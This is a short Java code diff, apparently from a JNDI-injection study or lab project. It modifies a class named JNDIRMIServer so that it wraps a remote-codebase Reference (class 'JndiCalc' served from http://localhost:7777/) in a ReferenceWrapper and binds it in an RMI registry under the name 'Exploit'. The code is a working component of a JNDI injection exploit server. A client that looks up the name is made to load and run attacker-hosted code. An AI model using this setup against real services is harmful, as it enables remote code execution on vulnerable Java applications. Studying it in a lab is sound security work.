@@ -1,3 +1,5 @@
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+
 import javax.naming.InitialContext;
 import javax.naming.Reference;
 import java.rmi.registry.LocateRegistry;
@@ -11,6 +13,8 @@ public class JNDIRMIServer {
 //         initialContext.rebind("rmi://localhost:1099/remoteObj", new RemoteObjImpl());
         // JNDI 注入漏洞
         Reference reference = new Reference("JndiCalc","JndiCalc","http://localhost:7777/");
-        initialContext.rebind("rmi://localhost:1099/remoteObj", reference);
+        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
+        System.out.println("[*]Binding 'Exploit' to 'rmi://127.0.0.1:1099/Exploit'");
+        registry.bind("Exploit", referenceWrapper);
     }
 }
